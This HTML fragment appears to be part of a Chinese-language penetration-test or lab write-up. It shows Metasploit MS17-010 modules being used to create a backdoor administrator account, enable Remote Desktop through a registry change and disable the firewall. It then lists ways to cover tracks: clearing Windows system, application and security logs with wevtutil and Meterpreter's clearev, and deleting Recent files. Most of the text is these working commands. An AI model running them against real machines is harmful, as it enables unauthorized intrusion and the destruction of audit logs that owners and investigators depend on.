+<p><img src="/_resources/7f80eb55215644b0b9c09df64db6f51d.png" alt="9f77a1164dfa23e9c06a612f48760bbd.png" width="792" height="539" class="jop-noMdConv" /> <img src="/_resources/bbf1a6167edb4155af0197df50c1b7df.png" alt="e55483a3394c21c907b6fa8162eda9e5.png" width="908" height="197" class="jop-noMdConv" /></p>
+<p>发现smb服务，尝试利用smb漏洞</p>
+<p><code>use exploit/windows/smb/ms17_010_psexec</code>未成功</p>
+<p>用<code>use auxiliary/admin/smb/ms17_010_command</code>添加用户并开启3389然后连接</p>
+<div><pre class="hljs"><code><span class="hljs-keyword">set</span> <span class="hljs-keyword">command</span> <span class="hljs-string">"net user hack #hack123@ /add"</span> 创建用户
+
+<span class="hljs-keyword">set</span> <span class="hljs-keyword">command</span>  <span class="hljs-string">"net localgroup Administrators hack /add"</span> 
+
+<span class="hljs-keyword">set</span> <span class="hljs-keyword">command</span> ‘REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">" "</span>Server <span class="hljs-string">/v</span> fDenyTSConnections <span class="hljs-string">/t</span> REG_DWORD <span class="hljs-string">/d</span> 00000000 <span class="hljs-string">/f</span>’ 打开3389端口
+
+<span class="hljs-keyword">set</span> <span class="hljs-keyword">command</span>  <span class="hljs-string">"netsh firewall set opmode mode=disable"</span>  关闭防火墙</code></pre></div>
+<hr />
+<p>这是清理痕迹的一些参考方法</p>
+<div><pre class="hljs"><code>有远程桌面权限时手动删除日志：
+开始-程序-管理工具-计算机管理-系统工具-事件查看器-清除日志
+
+wevtutil：
+    wevtutil <span class="hljs-keyword">el</span> 列出系统中所有日志名称
+    wevtutil <span class="hljs-keyword">cl</span> <span class="hljs-built_in">system</span> 清理系统日志
+    wevtutil <span class="hljs-keyword">cl</span> application 清理应用程序日志
+    wevtutil <span class="hljs-keyword">cl</span> security 清理安全日志
+
+meterperter自带清除日志功能：
+clearev 清除windows中的应用程序日志、系统日志、安全日志
+
+清除recent：
+在文件资源管理器中点击 <span class="hljs-string">"查看"</span> -&gt; <span class="hljs-string">"选项"</span> -&gt;在常规-&gt;隐私中点击<span class="hljs-string">" 清除"</span> 按钮
+或直接打开C:\Users\Administrator\Recent并删除所有内容
+或在命令行中输入del /<span class="hljs-keyword">f</span> /s /q  <span class="hljs-comment">"%userprofile%\Recent*.*</span></code></pre></div>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
